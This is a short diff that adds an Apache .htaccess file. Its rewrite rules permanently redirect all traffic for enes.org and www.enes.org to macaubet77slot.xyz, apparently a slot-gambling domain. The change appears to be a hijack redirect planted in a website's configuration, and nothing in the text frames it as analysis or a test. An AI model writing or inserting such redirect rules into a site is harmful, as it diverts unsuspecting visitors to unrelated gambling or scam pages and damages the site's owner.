@@ -1,0 +1,4 @@
+RewriteEngine on
+RewriteCond %{HTTP_HOST} ^enes\.org$ [OR]
+RewriteCond %{HTTP_HOST} ^www\.enes\.org$
+RewriteRule ^(.*)$ "https\:\/\/macaubet77slot\.xyz\/$1" [R=301,L]
